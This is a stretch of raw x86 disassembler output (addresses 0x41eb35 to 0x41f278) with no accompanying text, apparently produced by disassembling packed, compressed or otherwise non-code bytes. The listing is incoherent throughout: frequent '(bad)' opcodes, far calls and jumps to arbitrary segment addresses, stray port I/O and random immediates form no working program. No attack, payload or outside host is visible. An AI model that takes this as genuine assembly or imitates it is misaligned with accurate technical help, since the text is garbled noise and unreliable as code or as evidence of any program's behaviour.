  41eb35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb36:	bound  ecx,QWORD PTR [ebx-0x730162eb]
  41eb3c:	test   BYTE PTR ds:0x9c5841b8,al
  41eb42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb43:	mov    cl,0x3b
  41eb45:	pop    ss
  41eb46:	mov    al,ds:0x4e3e447e
  41eb4b:	loope  0x41ebbd
  41eb4d:	call   0x67ce:0xd5666a39
  41eb54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb55:	xlat   BYTE PTR ds:[ebx]
  41eb56:	shl    BYTE PTR [eax],0x8c
  41eb59:	or     bl,BYTE PTR [esi+0x74]
  41eb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb5d:	mov    ds:0x70aaef65,eax
  41eb62:	inc    esi
  41eb63:	aad    0x19
  41eb65:	sahf   
  41eb66:	or     BYTE PTR [edi+0x5ab6a0f6],al
  41eb6c:	sbb    DWORD PTR [edx],0xffffff93
  41eb6f:	into   
  41eb70:	outs   dx,BYTE PTR ds:[esi]
  41eb71:	cmp    DWORD PTR [edi],ebx
  41eb73:	int    0x54
  41eb75:	dec    esp
  41eb76:	inc    esi
  41eb77:	and    esi,ebp
  41eb79:	mov    esi,0xa1990c96
  41eb7e:	dec    edi
  41eb7f:	dec    ebx
  41eb80:	push   edx
  41eb81:	push   es
  41eb82:	xchg   ecx,eax
  41eb83:	jae    0x41ebe2
  41eb85:	pop    ds
  41eb86:	mov    al,0x3f
  41eb88:	xor    al,0xbe
  41eb8a:	push   0x50
  41eb8c:	clc    
  41eb8d:	fcmovbe st,st(4)
  41eb8f:	mov    ebp,0x6237f2ee
  41eb94:	or     DWORD PTR [esi+0x7e7aacfe],ecx
  41eb9a:	xorps  xmm7,XMMWORD PTR [edx]
  41eb9d:	jns    0x41ebc0
  41eb9f:	fs retf 0x4553
  41eba3:	push   0x25
  41eba5:	ds push 0xd622a441
  41ebab:	test   eax,0x25bed993
  41ebb0:	retf   
  41ebb1:	adc    eax,0xe0127851
  41ebb6:	outs   dx,BYTE PTR ds:[esi]
  41ebb7:	jo     0x41eb8e
  41ebb9:	adc    al,0xe2
  41ebbb:	mov    dl,0xbc
  41ebbd:	cwde   
  41ebbe:	dec    esp
  41ebbf:	pop    edi
  41ebc0:	xchg   ecx,eax
  41ebc1:	ss xor ecx,ebx
  41ebc4:	ins    BYTE PTR es:[edi],dx
  41ebc5:	out    0xc4,al
  41ebc7:	ret    
  41ebc8:	cwde   
  41ebc9:	jg     0x41ebe5
  41ebcb:	and    eax,0x4408a8ff
  41ebd0:	in     al,dx
  41ebd1:	out    dx,al
  41ebd2:	and    al,bl
  41ebd4:	jo     0x41ebb9
  41ebd6:	cdq    
  41ebd7:	xor    al,0xf2
  41ebd9:	mov    ebp,0x75122939
  41ebde:	jle    0x41ec37
  41ebe0:	lods   eax,DWORD PTR fs:[esi]
  41ebe2:	xor    dh,BYTE PTR [ebx+0x4ca8e119]
  41ebe8:	mov    edi,0xed356021
  41ebed:	test   BYTE PTR [edx],al
  41ebef:	inc    esp
  41ebf0:	push   eax
  41ebf1:	adc    edi,eax
  41ebf3:	call   0x67cc:0xd6b82492
  41ebfa:	or     al,0x9e
  41ebfc:	or     al,0x50
  41ebfe:	fs mov esp,0xc381d5f3
  41ec04:	(bad)  
  41ec06:	retf   0xf12f
  41ec09:	je     0x41ec72
  41ec0b:	repz daa 
  41ec0d:	xchg   edi,eax
  41ec0e:	adc    DWORD PTR [ecx+edx*1],ebx
  41ec11:	jo     0x41ec23
  41ec13:	cmp    DWORD PTR [edi+edi*2+0x4b],ebp
  41ec17:	jl     0x41ebe0
  41ec19:	and    ecx,0x41
  41ec1c:	mov    dl,0x2f
  41ec1e:	dec    ecx
  41ec1f:	dec    edx
  41ec20:	js     0x41eba9
  41ec22:	sbb    BYTE PTR [edx-0x79e6d03c],0xac
  41ec29:	dec    esi
  41ec2a:	pop    esi
  41ec2b:	je     0x41ebdc
  41ec2d:	push   es
  41ec2e:	jnp    0x41ec67
  41ec30:	aad    0xac
  41ec32:	mov    cl,bl
  41ec34:	pop    esp
  41ec35:	inc    edx
  41ec36:	jmp    0x41ebeb
  41ec38:	imul   ebp,eax,0x82b97378
  41ec3e:	cmc    
  41ec3f:	sub    BYTE PTR [ebp+ebp*8+0x5d],cl
  41ec43:	adc    BYTE PTR ds:0xadc13471,dl
  41ec49:	xchg   ecx,eax
  41ec4a:	fdiv   st,st(7)
  41ec4c:	mov    es,WORD PTR [edi+0x3893a8b0]
  41ec52:	lock adc esp,DWORD PTR [ebp-0x66]
  41ec56:	adc    esp,DWORD PTR [esi]
  41ec58:	(bad)  
  41ec59:	xchg   edi,eax
  41ec5a:	(bad)  
  41ec5b:	mov    bl,0xf2
  41ec5d:	inc    eax
  41ec5e:	sti    
  41ec5f:	xchg   DWORD PTR [eax+0x5e],ebp
  41ec62:	sub    eax,0x17fff86c
  41ec67:	mov    bh,0xff
  41ec69:	or     al,ah
  41ec6b:	mov    ?,WORD PTR gs:[ecx-0x6d]
  41ec6f:	sar    BYTE PTR [ebx],1
  41ec71:	push   es
  41ec72:	mov    edi,0x88883417
  41ec77:	shr    DWORD PTR [esi],cl
  41ec79:	aas    
  41ec7a:	xor    BYTE PTR [edx-0x56],dl
  41ec7d:	dec    ebp
  41ec7e:	leave  
  41ec7f:	imul   edx,ecx,0x27
  41ec82:	sub    BYTE PTR cs:[ecx-0x36acb6e],al
  41ec89:	add    al,0x36
  41ec8b:	push   esp
  41ec8c:	adc    eax,0x6f841087
  41ec91:	and    eax,0x69b9e9b4
  41ec96:	mov    ebp,0x99bd82df
  41ec9b:	sahf   
  41ec9c:	mov    ?,WORD PTR [esi-0x15]
  41ec9f:	xchg   edi,eax
  41eca0:	in     eax,0x68
  41eca2:	push   ebp
  41eca3:	mov    edi,DWORD PTR [edx-0x61]
  41eca6:	sar    ch,0x55
  41eca9:	rcr    dl,0x8e
  41ecac:	push   esp
  41ecad:	xchg   edi,eax
  41ecae:	adc    BYTE PTR [edx],0x3
  41ecb1:	fld    DWORD PTR [ebp-0x46]
  41ecb4:	ins    BYTE PTR es:[edi],dx
  41ecb5:	sbb    BYTE PTR [ebx+0x5c],ah
  41ecb8:	adc    esp,ebp
  41ecba:	xor    cl,BYTE PTR [edi]
  41ecbc:	cdq    
  41ecbd:	pop    eax
  41ecbe:	in     eax,dx
  41ecbf:	lods   al,BYTE PTR ds:[esi]
  41ecc0:	loop   0x41ed18
  41ecc2:	xor    BYTE PTR [edx-0x22],al
  41ecc5:	popf   
  41ecc6:	hlt    
  41ecc7:	or     al,0xeb
  41ecc9:	mov    bh,BYTE PTR [ecx+0x4a]
  41eccc:	(bad)  
  41eccd:	retf   
  41ecce:	imul   esi,DWORD PTR [ecx+0x71027960],0x23cdcbed
  41ecd8:	dec    ebp
  41ecd9:	loopne 0x41ecbc
  41ecdb:	imul   ecx,DWORD PTR [edi-0x5f],0x69f6e63b
  41ece2:	scas   al,BYTE PTR es:[edi]
  41ece3:	or     al,0x1c
  41ece5:	dec    esp
  41ece6:	sub    al,0xfb
  41ece8:	fsub   DWORD PTR [eax]
  41ecea:	cmp    DWORD PTR [edi+0x37],esi
  41eced:	mov    cl,0x9d
  41ecef:	push   edi
  41ecf0:	jge    0x41ec75
  41ecf2:	push   ebx
  41ecf3:	das    
  41ecf4:	ja     0x41ed1d
  41ecf6:	pop    eax
  41ecf7:	jle    0x41ed27
  41ecf9:	pop    ds
  41ecfa:	jbe    0x41ecf9
  41ecfc:	test   eax,0x17ce1c18
  41ed01:	les    eax,FWORD PTR [ecx-0x71af2f62]
  41ed07:	inc    esp
  41ed08:	out    0x95,al
  41ed0a:	mov    edx,0x8be753e4
  41ed0f:	fs and eax,0x6f6c8353
  41ed15:	or     eax,0xbe52cc56
  41ed1a:	add    al,0x65
  41ed1c:	push   cs
  41ed1d:	fsub   st,st(3)
  41ed1f:	je     0x41ecf8
  41ed21:	jne    0x41ed50
  41ed23:	sbb    DWORD PTR [esp+ebx*1-0x4a],edi
  41ed27:	and    ebp,DWORD PTR [ecx-0x80]
  41ed2a:	mov    esp,0xc1921632
  41ed2f:	cld    
  41ed30:	jle    0x41ecb4
  41ed32:	imul   esi,DWORD PTR [edx-0x77],0x4a1ea23f
  41ed39:	pop    edi
  41ed3a:	and    edx,DWORD PTR [esi]
  41ed3c:	sti    
  41ed3d:	xchg   edi,eax
  41ed3e:	retf   0xc0df
  41ed41:	sti    
  41ed42:	xor    al,0x90
  41ed44:	mov    ch,0x2b
  41ed46:	mov    bl,0xca
  41ed48:	(bad)  
  41ed4a:	mov    edi,DWORD PTR [ecx]
  41ed4c:	lahf   
  41ed4d:	retf   
  41ed4e:	xor    DWORD PTR [bx+0x42],eax
  41ed52:	jecxz  0x41ed15
  41ed54:	push   ds
  41ed55:	cmp    DWORD PTR [edi+0xf],ecx
  41ed58:	sbb    BYTE PTR [eax],bl
  41ed5a:	jns    0x41ed3c
  41ed5c:	std    
  41ed5d:	inc    esp
  41ed5e:	push   ebp
  41ed5f:	fnstsw WORD PTR [eax+0x6cee4672]
  41ed65:	test   al,0x13
  41ed67:	dec    edx
  41ed68:	js     0x41ede9
  41ed6a:	push   ds
  41ed6b:	and    eax,DWORD PTR [edx]
  41ed6d:	and    esp,DWORD PTR [edx-0x52]
  41ed70:	sub    eax,0xdf7a3fb7
  41ed75:	inc    ebp
  41ed76:	repnz (bad) 
  41ed78:	loopne 0x41ed15
  41ed7a:	add    bh,0x81
  41ed7d:	xor    eax,ecx
  41ed7f:	jb     0x41edec
  41ed81:	push   edx
  41ed82:	pusha  
  41ed83:	pop    edx
  41ed84:	std    
  41ed85:	(bad)  [esp+ecx*2]
  41ed88:	dec    BYTE PTR [edx+esi*1-0x62c953d2]
  41ed8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed90:	jb     0x41ee0e
  41ed92:	(bad)
  41ed96:	jo     0x41eddc
  41ed98:	arpl   WORD PTR [edx+0x4ba57b3d],di
  41ed9e:	ror    BYTE PTR [eax+0x5f],0x2d
  41eda2:	jle    0x41ed37
  41eda4:	sbb    eax,0xe611a926
  41eda9:	push   0x16
  41edab:	mov    dl,0x73
  41edad:	pop    edi
  41edae:	mul    BYTE PTR [eax+0x4eb5d1d3]
  41edb4:	aaa    
  41edb5:	push   edx
  41edb6:	(bad)  
  41edb8:	mov    esi,0xc6322015
  41edbd:	mov    WORD PTR [eax],?
  41edbf:	jge    0x41ed8c
  41edc1:	jne    0x41edb8
  41edc3:	mov    edx,0xec6b28ec
  41edc8:	frstor [edi+0x52]
  41edcb:	scas   al,BYTE PTR es:[edi]
  41edcc:	aas    
  41edcd:	xchg   DWORD PTR [ebx],esp
  41edcf:	add    BYTE PTR [edi+0x793fc431],0xb1
  41edd6:	dec    esi
  41edd7:	imul   edx,DWORD PTR [esi],0x3e7a4e6f
  41eddd:	or     eax,0x2d7ce214
  41ede2:	jecxz  0x41ee4d
  41ede4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede5:	push   ebp
  41ede6:	inc    edx
  41ede7:	sti    
  41ede8:	dec    edi
  41ede9:	daa    
  41edea:	inc    esp
  41edeb:	cmp    BYTE PTR [edx+0x3b158189],dl
  41edf1:	test   BYTE PTR [eax+0x5e237a56],ch
  41edf7:	dec    eax
  41edf8:	or     ecx,DWORD PTR [edi-0x2e]
  41edfb:	sub    eax,0x9a8efd60
  41ee00:	pop    edi
  41ee01:	push   eax
  41ee02:	fst    DWORD PTR ds:[edi]
  41ee05:	fld    st(7)
  41ee07:	add    eax,0x89c1d80d
  41ee0c:	pop    ss
  41ee0d:	inc    edx
  41ee0e:	(bad)  
  41ee0f:	enter  0xea6d,0x50
  41ee13:	mov    cl,0x99
  41ee15:	fnstcw WORD PTR [ebx+edx*2]
  41ee18:	sbb    al,BYTE PTR [ebx+ebp*8+0x68db60e4]
  41ee1f:	addr16 push ebp
  41ee21:	xchg   DWORD PTR [edx+0xda35d53],esi
  41ee27:	adc    BYTE PTR [edi],ch
  41ee29:	push   ebp
  41ee2a:	inc    esi
  41ee2b:	jae    0x41ee9d
  41ee2d:	lods   eax,DWORD PTR ds:[esi]
  41ee2e:	stc    
  41ee2f:	or     DWORD PTR [ecx-0x79],edx
  41ee32:	fsub   QWORD PTR [edx]
  41ee34:	sub    al,0x13
  41ee36:	dec    edx
  41ee37:	jno    0x41ee55
  41ee39:	xchg   edi,eax
  41ee3a:	test   esp,ebp
  41ee3c:	xor    BYTE PTR [edi-0x18],bl
  41ee3f:	enter  0xaea7,0x6e
  41ee43:	popf   
  41ee44:	and    eax,0x8e139b42
  41ee49:	adc    edi,DWORD PTR [ecx+0x183b5714]
  41ee4f:	dec    ebx
  41ee50:	xor    eax,0x2a9efad9
  41ee55:	jb     0x41eec7
  41ee57:	jae    0x41edef
  41ee59:	adc    DWORD PTR [ebp+ebx*2+0x34464e93],edi
  41ee60:	sbb    al,0x3c
  41ee62:	in     al,0xe6
  41ee64:	add    BYTE PTR [eax+0x4a],bh
  41ee67:	push   esp
  41ee68:	(bad)  
  41ee69:	pop    edx
  41ee6a:	rcr    DWORD PTR [eax+0x32],0x19
  41ee6e:	dec    edi
  41ee6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee70:	or     BYTE PTR [esp+eiz*2-0x4996b7e],ch
  41ee77:	jo     0x41ee56
  41ee79:	jg     0x41ee65
  41ee7b:	push   ss
  41ee7c:	cld    
  41ee7d:	push   es
  41ee7e:	push   0xfffffff1
  41ee80:	xchg   edi,eax
  41ee81:	xchg   esp,eax
  41ee82:	cld    
  41ee83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee84:	and    al,0x9a
  41ee86:	nop
  41ee87:	push   cs
  41ee88:	rcl    DWORD PTR [esi+0x3f76bd1a],cl
  41ee8e:	and    bh,BYTE PTR [eax]
  41ee90:	mov    esp,0xf0be2a7a
  41ee95:	sbb    DWORD PTR [ebp-0x549eaded],ebx
  41ee9b:	adc    al,0x8
  41ee9d:	sti    
  41ee9e:	lock and al,BYTE PTR [ebp-0x57deac3]
  41eea5:	test   al,0x8b
  41eea7:	das    
  41eea8:	lods   eax,DWORD PTR ds:[esi]
  41eea9:	push   edx
  41eeaa:	pop    ds
  41eeab:	adc    DWORD PTR [ebx],edx
  41eead:	mov    BYTE PTR ds:0x9d29857,ch
  41eeb3:	add    ecx,DWORD PTR [eax]
  41eeb5:	inc    eax
  41eeb6:	arpl   WORD PTR [esi+0x38],di
  41eeb9:	ror    BYTE PTR [edx-0x384dea7a],1
  41eebf:	xor    eax,0x71787afb
  41eec4:	adc    BYTE PTR [ebp+edx*1-0x3eb9f25c],cl
  41eecb:	push   cs
  41eecc:	test   al,0x14
  41eece:	or     cl,BYTE PTR [esi]
  41eed0:	lds    eax,FWORD PTR [esi+esi*1-0x58]
  41eed4:	dec    ebp
  41eed5:	stc    
  41eed6:	shr    BYTE PTR [esi-0x47],1
  41eed9:	jae    0x41eeaf
  41eedb:	jmp    0xcb70:0x9b27debc
  41eee2:	pop    ss
  41eee3:	and    eax,0x63eea609
  41eee8:	bound  ebp,QWORD PTR [eax-0x8]
  41eeeb:	or     al,0x11
  41eeed:	mov    ds:0x53f46780,eax
  41eef2:	rcl    DWORD PTR [edx-0x5177ff1e],1
  41eef8:	cmp    BYTE PTR [di+0x3dc8],cl
  41eefd:	pushf  
  41eefe:	ss cdq 
  41ef00:	and    al,0xc4
  41ef02:	les    ebp,FWORD PTR [eax]
  41ef04:	stos   BYTE PTR es:[edi],al
  41ef05:	dec    ecx
  41ef06:	push   ecx
  41ef07:	inc    eax
  41ef08:	adc    BYTE PTR [edx-0x5a],ah
  41ef0b:	(bad)  
  41ef0c:	arpl   WORD PTR [ecx-0x55],si
  41ef0f:	pop    ss
  41ef10:	xchg   ecx,eax
  41ef11:	xchg   BYTE PTR [edx+esi*8],bl
  41ef14:	call   0x46a6:0x657d8b2
  41ef1b:	pop    ss
  41ef1c:	jo     0x41ef91
  41ef1e:	adc    eax,0x2ecb8f5e
  41ef23:	xor    eax,0xc66eb44d
  41ef28:	xchg   esi,eax
  41ef29:	dec    esp
  41ef2a:	(bad)  
  41ef2b:	cmc    
  41ef2c:	inc    edx
  41ef2d:	sub    al,0xaf
  41ef2f:	jmp    0x1147:0x29559a3e
  41ef36:	xchg   esp,eax
  41ef37:	(bad)  
  41ef38:	leave  
  41ef39:	push   0xa271fbf5
  41ef3e:	pushf  
  41ef3f:	into   
  41ef40:	push   ecx
  41ef41:	cmp    bl,ah
  41ef43:	mov    edx,0xe1f0b69d
  41ef48:	les    esi,FWORD PTR [eax-0x48]
  41ef4b:	aas    
  41ef4c:	in     eax,0x61
  41ef4e:	mov    ah,0x9d
  41ef50:	push   0xffffff84
  41ef52:	inc    ebp
  41ef53:	hlt    
  41ef54:	cli    
  41ef55:	retf   
  41ef56:	inc    ebp
  41ef57:	adc    ecx,DWORD PTR [eax+0x54]
  41ef5a:	mov    edi,0x408048d2
  41ef5f:	mov    eax,ds:0x46a25033
  41ef64:	call   0xd788:0xfa7858f8
  41ef6b:	pop    es
  41ef6c:	mov    bl,BYTE PTR [ecx]
  41ef6e:	xlat   BYTE PTR ds:[ebx]
  41ef6f:	int    0xf7
  41ef71:	nop
  41ef72:	inc    esi
  41ef73:	test   eax,0xcf708b9c
  41ef78:	outs   dx,DWORD PTR ds:[esi]
  41ef79:	xchg   DWORD PTR [esi],ebp
  41ef7b:	jmp    0xadd40bd0
  41ef80:	sub    DWORD PTR [esi],0xfffffff2
  41ef83:	fwait
  41ef84:	enter  0xde03,0x91
  41ef88:	ror    edi,cl
  41ef8a:	enter  0x7d11,0x1a
  41ef8e:	add    DWORD PTR [ebx-0x64],ebp
  41ef91:	inc    edx
  41ef92:	mov    bl,0x4c
  41ef94:	pop    ss
  41ef95:	push   ebx
  41ef96:	stc    
  41ef97:	pop    ecx
  41ef98:	fs mov edx,0xde9737e5
  41ef9e:	push   ss
  41ef9f:	daa    
  41efa0:	lahf   
  41efa1:	int    0x61
  41efa3:	adc    al,0x4e
  41efa5:	fld    DWORD PTR [edx-0x6]
  41efa8:	dec    edx
  41efa9:	cdq    
  41efaa:	rcr    BYTE PTR [esi],cl
  41efac:	jg     0x41ef72
  41efae:	mov    ebp,0xec57b4f3
  41efb3:	push   ss
  41efb4:	sub    ebx,ebp
  41efb6:	cdq    
  41efb7:	addr16 mov ah,0xed
  41efba:	sub    BYTE PTR [ecx],dl
  41efbc:	lahf   
  41efbd:	(bad)  
  41efbe:	lock (bad) 
  41efc0:	scas   al,BYTE PTR es:[edi]
  41efc1:	xchg   ebx,eax
  41efc2:	retf   
  41efc3:	add    edx,DWORD PTR [edx+0x1c383291]
  41efc9:	inc    esi
  41efca:	(bad)  
  41efcb:	jle    0x41f003
  41efcd:	or     ah,BYTE PTR [edi-0x6d]
  41efd0:	fiadd  WORD PTR [edx]
  41efd2:	jge    0x41f032
  41efd4:	pop    ss
  41efd5:	xchg   ecx,eax
  41efd6:	inc    edi
  41efd7:	sub    al,0x1
  41efd9:	xchg   esi,eax
  41efda:	jo     0x41f054
  41efdc:	add    ebx,DWORD PTR [esi]
  41efde:	les    ebp,FWORD PTR [ecx-0xd]
  41efe1:	outs   dx,DWORD PTR ds:[esi]
  41efe2:	iret   
  41efe3:	aas    
  41efe4:	cli    
  41efe5:	cmp    BYTE PTR [ebx-0x14],cl
  41efe8:	jbe    0x41efae
  41efea:	or     ah,bl
  41efec:	mov    WORD PTR [eax+0x4],?
  41efef:	mov    edi,0xc3065ebb
  41eff4:	shl    WORD PTR [esi],1
  41eff7:	inc    eax
  41eff8:	push   esp
  41eff9:	add    BYTE PTR [esi-0x31aeb4d7],bh
  41efff:	popf   
  41f000:	xchg   esp,eax
  41f001:	sub    edx,DWORD PTR [ebp+0x6e]
  41f004:	test   ecx,edi
  41f006:	jne    0x41f00a
  41f008:	fs or  edi,ebp
  41f00b:	pushf  
  41f00c:	adc    esi,0xffffffef
  41f00f:	mov    dl,0x6a
  41f011:	and    al,0x3d
  41f013:	and    bl,BYTE PTR [edi]
  41f015:	pop    ebx
  41f016:	iret   
  41f017:	cdq    
  41f018:	lods   al,BYTE PTR ds:[esi]
  41f019:	add    BYTE PTR [eax-0x9ecbaee],dl
  41f01f:	dec    esi
  41f020:	es loope 0x41f017
  41f023:	pop    ds
  41f024:	retf   
  41f025:	pop    ebx
  41f026:	fidiv  DWORD PTR [edi-0x59]
  41f029:	popf   
  41f02a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f02b:	nop
  41f02c:	inc    eax
  41f02d:	add    dl,BYTE PTR [ecx]
  41f02f:	sub    bh,bl
  41f031:	xchg   ebx,eax
  41f032:	mov    al,0x2f
  41f034:	shl    BYTE PTR [edx],cl
  41f036:	mov    bh,0x7f
  41f038:	repnz dec ecx
  41f03a:	xchg   dh,bl
  41f03c:	cmc    
  41f03d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f03e:	fldenv [ecx-0x12ea2c0e]
  41f044:	ret    0xb73e
  41f047:	mov    eax,0xec3f856a
  41f04c:	push   edx
  41f04d:	rcl    DWORD PTR ds:0xed9701ef,0xca
  41f054:	fwait
  41f055:	jae    0x41efeb
  41f057:	out    0xc5,al
  41f059:	nop
  41f05a:	test   eax,0x122e11ac
  41f05f:	neg    BYTE PTR [eax]
  41f061:	icebp  
  41f062:	iret   
  41f063:	neg    DWORD PTR [ebx+ebp*2-0x33dcb5e2]
  41f06a:	pop    esi
  41f06b:	rol    DWORD PTR [edx-0x44b79459],1
  41f071:	cli    
  41f072:	je     0x41f06a
  41f074:	in     eax,dx
  41f075:	jns    0x41f095
  41f077:	fdiv   DWORD PTR [ebx+0x75]
  41f07a:	pop    es
  41f07b:	jmp    0x41f07d
  41f07d:	adc    eax,0x55e84301
  41f082:	add    al,0x6f
  41f084:	push   ecx
  41f085:	sub    al,0x31
  41f087:	popa   
  41f088:	push   eax
  41f089:	stc    
  41f08a:	push   0x1c07b686
  41f08f:	bound  esi,QWORD PTR [ebx-0x4843400d]
  41f095:	mov    bh,0x48
  41f097:	jmp    0x1c307df2
  41f09c:	pop    ebp
  41f09d:	outs   dx,DWORD PTR ds:[esi]
  41f09e:	das    
  41f09f:	rcr    bh,cl
  41f0a1:	push   cs
  41f0a2:	mov    ah,0x1b
  41f0a4:	xchg   BYTE PTR [ebp+0xf],dh
  41f0a7:	stos   DWORD PTR es:[edi],eax
  41f0a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0a9:	call   0xd9c2:0x57c4e776
  41f0b0:	(bad)  
  41f0b1:	std    
  41f0b2:	leave  
  41f0b3:	sub    eax,0x937797d
  41f0b8:	push   ebp
  41f0b9:	and    bl,BYTE PTR [ebx+0x9]
  41f0bc:	paddq  mm3,QWORD PTR [eax+edi*1+0x77]
  41f0c1:	sbb    eax,0x99cbe74f
  41f0c6:	sbb    al,0x59
  41f0c8:	adc    bh,cl
  41f0ca:	dec    ebp
  41f0cb:	in     eax,0x96
  41f0cd:	cmp    dl,BYTE PTR [edx]
  41f0cf:	jo     0x41f10f
  41f0d1:	inc    ecx
  41f0d2:	xchg   esi,eax
  41f0d3:	cdq    
  41f0d4:	aaa    
  41f0d5:	mov    ch,0xef
  41f0d7:	in     al,dx
  41f0d8:	mov    al,ds:0x74c8ed1f
  41f0dd:	mov    al,0xff
  41f0df:	gs dec esp
  41f0e1:	lods   eax,DWORD PTR ds:[esi]
  41f0e2:	mov    DWORD PTR [esp+ebx*2-0x5dfda922],ecx
  41f0e9:	dec    esp
  41f0ea:	push   eax
  41f0eb:	and    BYTE PTR [edi+0x2c3321e9],dl
  41f0f1:	jg     0x41f0d9
  41f0f3:	int    0xb0
  41f0f5:	lods   al,BYTE PTR ds:[esi]
  41f0f6:	and    BYTE PTR [edi],al
  41f0f8:	push   0x32
  41f0fa:	retf   
  41f0fb:	or     DWORD PTR [ebx*1+0x6072483e],edx
  41f102:	and    eax,0x9b39bddc
  41f107:	sbb    dh,ch
  41f109:	cmp    eax,0x767be900
  41f10e:	inc    esi
  41f10f:	pop    ebp
  41f110:	out    0xc0,al
  41f112:	pop    ecx
  41f113:	es call 0x6cf00ba8
  41f119:	xor    edx,eax
  41f11b:	xor    edi,edi
  41f11d:	lock std 
  41f11f:	rcr    BYTE PTR [edi],0xc7
  41f122:	scas   al,BYTE PTR es:[edi]
  41f123:	xor    eax,0xfaccec9b
  41f128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f129:	xchg   esp,eax
  41f12a:	in     al,dx
  41f12b:	jbe    0x41f12d
  41f12d:	or     eax,0x9c028382
  41f132:	stc    
  41f133:	sahf   
  41f134:	je     0x41f143
  41f136:	cwde   
  41f137:	sbb    al,0xed
  41f139:	adc    BYTE PTR [ecx+0x55faa63e],al
  41f13f:	fadd   DWORD PTR [ebx]
  41f141:	pusha  
  41f142:	jg     0x41f19c
  41f144:	sbb    al,0x72
  41f146:	xchg   ebp,eax
  41f147:	popf   
  41f148:	mov    bl,0x5d
  41f14a:	push   cs
  41f14b:	and    eax,0x70f06b44
  41f150:	stos   DWORD PTR es:[edi],eax
  41f151:	inc    ecx
  41f152:	xchg   edi,eax
  41f153:	repz cwde 
  41f155:	inc    ebp
  41f156:	stos   BYTE PTR es:[edi],al
  41f157:	or     ah,BYTE PTR [edi-0x7b]
  41f15a:	mov    ebp,0x1993a4ea
  41f15f:	mov    edx,0x642b51e0
  41f164:	loope  0x41f116
  41f166:	and    bh,BYTE PTR [eax+0xe12bc9e]
  41f16c:	mov    ch,BYTE PTR [eax+0x6a643782]
  41f172:	and    al,0xf7
  41f174:	xor    BYTE PTR [esi+0x674c0590],ah
  41f17a:	or     DWORD PTR [edi-0x4b],ebx
  41f17d:	adc    DWORD PTR es:[edx-0x13],eax
  41f181:	sub    bh,BYTE PTR [edi]
  41f183:	pushf  
  41f184:	loope  0x41f18f
  41f186:	ret    0xa2d3
  41f189:	push   ss
  41f18a:	adc    BYTE PTR [edi+0x1d],0xe
  41f18e:	std    
  41f18f:	and    dh,al
  41f191:	out    0x9b,eax
  41f193:	es sub eax,0x50261b1d
  41f199:	inc    esp
  41f19a:	cdq    
  41f19b:	sbb    ah,al
  41f19d:	push   esi
  41f19e:	jne    0x41f152
  41f1a0:	or     eax,0x26e1c3ea
  41f1a5:	or     dh,bl
  41f1a7:	jle    0x41f158
  41f1a9:	rol    al,cl
  41f1ab:	into   
  41f1ac:	nop    ebx
  41f1af:	mov    WORD PTR [ecx],?
  41f1b1:	fmul   DWORD PTR [ebx-0x38]
  41f1b4:	pushf  
  41f1b5:	add    DWORD PTR ds:0x85e73789,0xf046e563
  41f1bf:	mov    BYTE PTR [ebx+0x60c9b3b4],0x65
  41f1c6:	or     BYTE PTR [edi-0x70b00fdb],bh
  41f1cc:	pop    ss
  41f1cd:	cli    
  41f1ce:	or     BYTE PTR ds:0x336b0df0,dh
  41f1d4:	pop    ds
  41f1d5:	xchg   DWORD PTR [edi+esi*2-0x6725894],edi
  41f1dc:	scas   eax,DWORD PTR es:[edi]
  41f1dd:	xor    DWORD PTR [edi],esi
  41f1df:	pop    ss
  41f1e0:	loope  0x41f170
  41f1e2:	pop    ecx
  41f1e3:	popa   
  41f1e4:	int3   
  41f1e5:	inc    ecx
  41f1e6:	out    dx,eax
  41f1e7:	dec    edx
  41f1e8:	sbb    BYTE PTR [edi],cl
  41f1ea:	push   ebp
  41f1eb:	inc    edx
  41f1ec:	xor    eax,0xab107b0d
  41f1f1:	sbb    bh,bl
  41f1f3:	pop    edi
  41f1f4:	retf   
  41f1f5:	jnp    0x41f1e4
  41f1f7:	hlt    
  41f1f8:	call   0x6fde2220
  41f1fd:	les    ebx,FWORD PTR [esi]
  41f1ff:	push   esi
  41f200:	cmp    esp,DWORD PTR [edx-0x21]
  41f203:	mov    ds:0x2e458902,al
  41f208:	add    dh,BYTE PTR [ecx-0x3c9aee19]
  41f20e:	(bad)  
  41f20f:	sbb    dl,BYTE PTR [ebp-0x415c89e7]
  41f215:	pop    ebx
  41f216:	js     0x41f26d
  41f218:	mov    edx,0x80f2c572
  41f21d:	sub    bl,dh
  41f21f:	rcl    esi,0x1f
  41f222:	pop    ebx
  41f223:	adc    esi,DWORD PTR [ecx+0x1f5f09ea]
  41f229:	sub    edx,ebx
  41f22b:	(bad)  
  41f22c:	std    
  41f22d:	(bad)  
  41f22e:	fcomp  DWORD PTR [ebx+0x67]
  41f231:	popa   
  41f232:	int    0xfe
  41f234:	into   
  41f235:	mov    esp,0x5f6a04da
  41f23a:	fs sbb eax,0x3c11300c
  41f240:	fistp  DWORD PTR [edi-0x59]
  41f243:	pusha  
  41f244:	clc    
  41f245:	adc    ebp,DWORD PTR [ecx-0x5c]
  41f248:	bound  edx,QWORD PTR [eax]
  41f24a:	fild   DWORD PTR [ebx+eax*8-0x3f]
  41f24e:	enter  0x299e,0xea
  41f252:	sbb    ch,dh
  41f254:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f255:	push   di
  41f257:	sbb    cl,BYTE PTR [edi-0x4f4484f4]
  41f25d:	dec    eax
  41f25e:	adc    al,0x58
  41f260:	or     DWORD PTR [ebx-0x42],edx
  41f263:	push   0xffffffbb
  41f265:	mov    dh,0xfe
  41f267:	xor    ch,BYTE PTR [eax+0x6b]
  41f26a:	add    BYTE PTR [edx+0x4efd3fdf],0xe3
  41f271:	nop
  41f272:	sub    ebx,esp
  41f274:	fchs   
  41f276:	pop    eax
  41f277:	(bad)  
  41f278:	imul   edx
